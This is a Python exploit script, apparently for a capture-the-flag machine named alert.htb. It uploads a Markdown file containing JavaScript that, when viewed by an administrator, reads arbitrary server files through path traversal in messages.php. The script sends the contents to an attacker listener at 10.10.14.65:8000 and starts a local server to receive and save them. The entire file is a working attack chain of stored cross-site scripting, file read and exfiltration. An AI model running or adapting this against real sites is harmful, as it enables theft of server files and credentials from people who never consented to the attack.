import argparse
import requests
from io import BytesIO
import http.server
import socketserver
import threading
from urllib.parse import unquote
import os

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        query = self.path.split('?', 1)[-1]
        decoded = unquote(query)
        true_file = decoded.replace('file_content=<pre>','')
        true_file = true_file.replace('</pre>','')
        print(true_file)
        if (args.write):
            save_to_file(file_path,true_file)
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

parser = argparse.ArgumentParser(description="HTTP server and malicious file uploader.")
parser.add_argument("url", help="Target URL (e.g., http://alert.htb)")
parser.add_argument("file_path", help="File path to be included in the payload")
parser.add_argument('-w', '--write', action='store_true', help='Optional argument for word')
args = parser.parse_args()

url = args.url
file_path = args.file_path

file_content = f"""<script>
fetch('{url}/messages.php?file=../../../../../../../../../..{file_path}')
  .then(response => response.text())
  .then(data => {{
    fetch('http://10.10.14.65:8000/?file_content=' + encodeURIComponent(data));
  }});
</script>"""
file_content = bytes(file_content, 'utf-8')

def save_to_file(file_path,content):
    if not os.path.exists("files"):
        os.makedirs("files")
    file_name = file_path.split('/')[-1]
    with open(f"files/{file_name}",'w') as file:
        file.write(content)
    print(f"contents have been written to ./files/{file_name} ")
        
def start_http_server():
    with socketserver.TCPServer(("0.0.0.0", 8000), RequestHandler) as httpd:
        print("HTTP Server running on port 8000...")
        httpd.serve_forever()

server_thread = threading.Thread(target=start_http_server, daemon=True)
server_thread.start()

file = BytesIO(file_content)
response = requests.post(f"{url}/visualizer.php", files={"file": ("mate.md", file)}, allow_redirects=True)
html_content = response.text

link_index = html_content.find(f'{url}/visualizer.php?link_share=')
link = html_content[link_index:-53]
data = {
    "email": "doesnot@matter.com",
    "message": link
}
contact_response = requests.post(f"{url}/contact.php", data=data)

print("Script is running. Waiting for incoming requests...\n")
try:
    server_thread.join()
except KeyboardInterrupt:
    print("\nShutting down the HTTP server.")
